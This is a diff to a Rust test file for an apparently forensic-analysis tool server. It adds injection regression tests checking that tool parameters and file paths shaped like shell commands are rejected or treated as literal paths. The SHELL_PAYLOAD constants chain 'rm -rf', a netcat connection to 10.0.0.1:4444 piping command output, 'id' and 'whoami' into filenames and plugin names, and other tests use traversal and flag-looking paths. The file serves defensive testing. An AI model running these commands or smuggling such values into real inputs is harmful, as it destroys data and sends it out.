@@ -25,15 +25,23 @@ use std::path::PathBuf;
 use std::sync::{Mutex, MutexGuard, OnceLock};
 
 use findevil_mcp::{
-    case_open, evtx_query, mft_timeline, prefetch_parse, CaseOpenInput, EvtxError, EvtxQueryInput,
-    MftError, MftInput, PrefetchError, PrefetchInput,
+    ausearch, case_open, evtx_query, ez_parse, indx_parse, journalctl_query, login_accounting,
+    mac_triage, mft_timeline, nfdump_query, plaso_parse, prefetch_parse, suricata_eve, vol_run,
+    AusearchError, AusearchInput, CaseOpenInput, EvtxError, EvtxQueryInput, EzParseError,
+    EzParseInput, IndxError, IndxParseInput, JournalctlQueryError, JournalctlQueryInput,
+    LoginAccountingError, LoginAccountingInput, MacTriageError, MacTriageInput, MftError, MftInput,
+    NfdumpQueryError, NfdumpQueryInput, PlasoParseError, PlasoParseInput, PrefetchError,
+    PrefetchInput, SuricataEveError, SuricataEveInput, VolRunError, VolRunInput,
 };
 
-// A path string that would be catastrophic if any tool ever shelled out. Used as
-// a filename component, so it must not contain '/' (the only byte illegal in a
-// POSIX filename besides NUL). If a shell ever interpreted it, `touch`/`rm`/`nc`
-// would run; because nothing shells out, it is an inert sequence of bytes.
+// A string that would be catastrophic if any tool ever shelled out.
+// If a shell ever interpreted it, `touch`/`rm`/`nc` would run; because nothing
+// shells out, it is an inert sequence of bytes.
 const SHELL_PAYLOAD: &str = "evil; touch HACKED && $(rm -rf ~) | nc 10.0.0.1 4444 `id`";
+
+// The same guardrail exercised through real filesystem paths. Keep this one
+// valid as a filename on Windows as well as POSIX.
+const SHELL_PAYLOAD_FILENAME: &str = "evil; touch HACKED && $(rm -rf home) & whoami";
 
 fn env_lock() -> MutexGuard<'static, ()> {
     static LOCK: OnceLock<Mutex<()>> = OnceLock::new();
@@ -74,7 +82,7 @@ fn case_open_reads_shell_payload_filename_as_a_literal_file() {
     let _home = HomeGuard::set(tmp.path());
 
     let bytes = b"\x00MFT-ish evidence bytes for a hostile filename";
-    let evil = tmp.path().join(format!("{SHELL_PAYLOAD}.e01"));
+    let evil = tmp.path().join(format!("{SHELL_PAYLOAD_FILENAME}.e01"));
     fs::write(&evil, bytes).expect("write hostile-named evidence");
 
     let handle = case_open(&CaseOpenInput {
@@ -101,7 +109,7 @@ fn case_open_reads_shell_payload_filename_as_a_literal_file() {
 #[test]
 fn evtx_query_treats_shell_payload_path_as_missing_file() {
     let tmp = tempfile::tempdir().expect("tempdir");
-    let missing = tmp.path().join(format!("{SHELL_PAYLOAD}.evtx"));
+    let missing = tmp.path().join(format!("{SHELL_PAYLOAD_FILENAME}.evtx"));
 
     let err = evtx_query(&EvtxQueryInput {
         case_id: "c".to_string(),
@@ -138,6 +146,106 @@ fn prefetch_parse_treats_traversal_path_as_missing_file() {
 }
 
 #[test]
+fn vol_run_rejects_shell_payload_plugin_before_any_subprocess() {
+    // vol_run is the one parameterized verb whose argument (the plugin name)
+    // reaches argv. The allow-list is its injection boundary: a plugin string
+    // shaped like a shell payload is not on the list, so it is rejected with a
+    // typed PluginNotAllowed BEFORE any path check or subprocess spawn — even
+    // pointing at a real file. No `windows.cmdline` plugin ever runs.
+    let tmp = tempfile::tempdir().expect("tempdir");
+    let real = tmp.path().join("image.mem");
+    fs::write(&real, b"not really a memory image").expect("write");
+
+    let err = vol_run(&VolRunInput {
+        case_id: "c".to_string(),
+        memory_path: real,
+        plugin: format!("windows.cmdline; {SHELL_PAYLOAD}"),
+        pid: None,
+        limit: None,
+    })
+    .expect_err("a shell-payload plugin string must be rejected, not executed");
+
+    assert!(
+        matches!(err, VolRunError::PluginNotAllowed(_)),
+        "got {err:?}"
+    );
+    assert!(!tmp.path().join("HACKED").exists(), "no shell executed");
+}
+
+#[test]
+fn ez_parse_rejects_shell_payload_tool_before_any_subprocess() {
+    // ez_parse's `tool` parameter selects the binary. The allow-list is the
+    // injection boundary: a tool string shaped like a shell payload is not on
+    // the list, so it is rejected with ToolNotAllowed BEFORE any path check or
+    // subprocess — even pointing at a real file. No EZ binary ever runs.
+    let tmp = tempfile::tempdir().expect("tempdir");
+    let real = tmp.path().join("evil.lnk");
+    fs::write(&real, b"not really a lnk").expect("write");
+
+    let err = ez_parse(&EzParseInput {
+        case_id: "c".to_string(),
+        tool: format!("lecmd; {SHELL_PAYLOAD}"),
+        artifact_path: real,
+        limit: None,
+    })
+    .expect_err("a shell-payload tool string must be rejected, not executed");
+
+    assert!(
+        matches!(err, EzParseError::ToolNotAllowed(_)),
+        "got {err:?}"
+    );
+    assert!(!tmp.path().join("HACKED").exists(), "no shell executed");
+}
+
+#[test]
+fn plaso_parse_rejects_shell_payload_parser_before_any_subprocess() {
+    // plaso_parse's `parser` parameter reaches argv. The allow-list is the
+    // injection boundary: a parser string shaped like a shell payload is not on
+    // the list, so it is rejected with ParserNotAllowed BEFORE any path check or
+    // subprocess — even pointing at a real file. No plaso stage ever runs.
+    let tmp = tempfile::tempdir().expect("tempdir");
+    let real = tmp.path().join("auth.log");
+    fs::write(&real, b"Jun 13 sshd login").expect("write");
+
+    let err = plaso_parse(&PlasoParseInput {
+        case_id: "c".to_string(),
+        parser: format!("syslog; {SHELL_PAYLOAD}"),
+        artifact_path: real,
+        limit: None,
+    })
+    .expect_err("a shell-payload parser string must be rejected, not executed");
+
+    assert!(
+        matches!(err, PlasoParseError::ParserNotAllowed(_)),
+        "got {err:?}"
+    );
+    assert!(!tmp.path().join("HACKED").exists(), "no shell executed");
+}
+
+#[test]
+fn mac_triage_rejects_shell_payload_module_before_any_subprocess() {
+    // mac_triage's `module` parameter reaches argv. The allow-list is the
+    // injection boundary: a module string shaped like a shell payload is not on
+    // the list, so it is rejected with ModuleNotAllowed BEFORE any path check or
+    // subprocess — even pointing at a real directory. No mac_apt ever runs.
+    let tmp = tempfile::tempdir().expect("tempdir");
+
+    let err = mac_triage(&MacTriageInput {
+        case_id: "c".to_string(),
+        module: format!("UNIFIEDLOGS; {SHELL_PAYLOAD}"),
+        image_path: tmp.path().to_path_buf(),
+        limit: None,
+    })
+    .expect_err("a shell-payload module string must be rejected, not executed");
+
+    assert!(
+        matches!(err, MacTriageError::ModuleNotAllowed(_)),
+        "got {err:?}"
+    );
+    assert!(!tmp.path().join("HACKED").exists(), "no shell executed");
+}
+
+#[test]
 fn mft_timeline_treats_flag_looking_path_as_a_literal_path() {
     // A path that looks like a CLI flag is a path, not a flag — these tools never
     // forward it to argv parsing, and a missing one is a typed NotFound.
@@ -154,4 +262,121 @@ fn mft_timeline_treats_flag_looking_path_as_a_literal_path() {
     .expect_err("flag-looking missing path must be a clean typed error");
 
     assert!(matches!(err, MftError::MftNotFound(_)));
+}
+
+#[test]
+fn journalctl_query_treats_shell_payload_path_as_missing_file() {
+    // The journal_path becomes a single `--file` argv element, never a shell
+    // fragment — a hostile path to a missing file is a clean typed NotFound,
+    // and journalctl is never even spawned (the existence check fails first).
+    let tmp = tempfile::tempdir().expect("tempdir");
+    let missing = tmp.path().join(format!("{SHELL_PAYLOAD_FILENAME}.journal"));
+
+    let err = journalctl_query(&JournalctlQueryInput {
+        case_id: "c".to_string(),
+        journal_path: missing,
+        since: None,
+        until: None,
+        limit: None,
+    })
+    .expect_err("a non-existent hostile path must error, not execute");
+
+    assert!(matches!(err, JournalctlQueryError::NotFound(_)));
+    assert!(!tmp.path().join("HACKED").exists());
+}
+
+#[test]
+fn login_accounting_treats_flag_looking_path_as_a_literal_path() {
+    // A path that looks like a CLI flag is a path, not a flag — it becomes a
+    // single `-f` argv element and a missing one is a clean typed NotFound.
+    let tmp = tempfile::tempdir().expect("tempdir");
+    let flaggy = tmp.path().join("--output=__rooted__ -rf wtmp");
+
+    let err = login_accounting(&LoginAccountingInput {
+        case_id: "c".to_string(),
+        accounting_path: flaggy,
+        limit: None,
+    })
+    .expect_err("flag-looking missing path must be a clean typed error");
+
+    assert!(matches!(err, LoginAccountingError::NotFound(_)));
+    assert!(!tmp.path().join("HACKED").exists());
+}
+
+#[test]
+fn ausearch_treats_traversal_path_as_missing_file() {
+    // A `..` traversal to a non-existent audit.log resolves cleanly to NotFound —
+    // no panic, no jail to escape, and ausearch is never spawned.
+    let tmp = tempfile::tempdir().expect("tempdir");
+    let traversal: PathBuf = tmp
+        .path()
+        .join("..")
+        .join("..")
+        .join("..")
+        .join("nonexistent-EVIL-audit.log");
+
+    let err = ausearch(&AusearchInput {
+        case_id: "c".to_string(),
+        audit_log_path: traversal,
+        limit: None,
+    })
+    .expect_err("traversal to a missing file must be a clean typed error");
+
+    assert!(matches!(err, AusearchError::NotFound(_)));
+}
+
+#[test]
+fn nfdump_query_treats_shell_payload_path_as_missing_file() {
+    // FIXED `-r <flow_path> -o json` argv, no free-text filter field — a hostile
+    // flow_path is one inert argv element; a missing one is a typed FlowNotFound
+    // (the existence check runs before any spawn, so this holds with or without
+    // nfdump installed).
+    let tmp = tempfile::tempdir().expect("tempdir");
+    let missing = tmp.path().join(format!("{SHELL_PAYLOAD_FILENAME}.nfcapd"));
+
+    let err = nfdump_query(&NfdumpQueryInput {
+        case_id: "c".to_string(),
+        flow_path: missing,
+        limit: None,
+    })
+    .expect_err("a non-existent hostile path must error, not execute");
+
+    assert!(matches!(err, NfdumpQueryError::FlowNotFound(_)));
+    assert!(!tmp.path().join("HACKED").exists());
+}
+
+#[test]
+fn suricata_eve_treats_shell_payload_path_as_missing_file() {
+    // FIXED `-r <pcap_path> -l <outdir>` argv — a hostile pcap_path is one inert
+    // argv element; a missing one is a typed PcapNotFound before any spawn.
+    let tmp = tempfile::tempdir().expect("tempdir");
+    let missing = tmp.path().join(format!("{SHELL_PAYLOAD_FILENAME}.pcap"));
+
+    let err = suricata_eve(&SuricataEveInput {
+        case_id: "c".to_string(),
+        pcap_path: missing,
+        limit: None,
+    })
+    .expect_err("a non-existent hostile path must error, not execute");
+
+    assert!(matches!(err, SuricataEveError::PcapNotFound(_)));
+    assert!(!tmp.path().join("HACKED").exists());
+}
+
+#[test]
+fn indx_parse_treats_shell_payload_path_as_missing_file() {
+    // FIXED `INDXParse.py <indx_path>` argv — a hostile indx_path is one inert
+    // argv element; a missing one is a typed NotFound before any spawn.
+    let tmp = tempfile::tempdir().expect("tempdir");
+    let missing = tmp.path().join(format!("{SHELL_PAYLOAD_FILENAME}.indx"));
+
+    let err = indx_parse(&IndxParseInput {
+        case_id: "c".to_string(),
+        indx_path: missing,
+        limit: None,
+    })
+    .expect_err("a non-existent hostile path must error, not execute");
+
+    assert!(matches!(err, IndxError::NotFound(_)));
+    assert!(!tmp.path().join("HACKED").exists());
 }
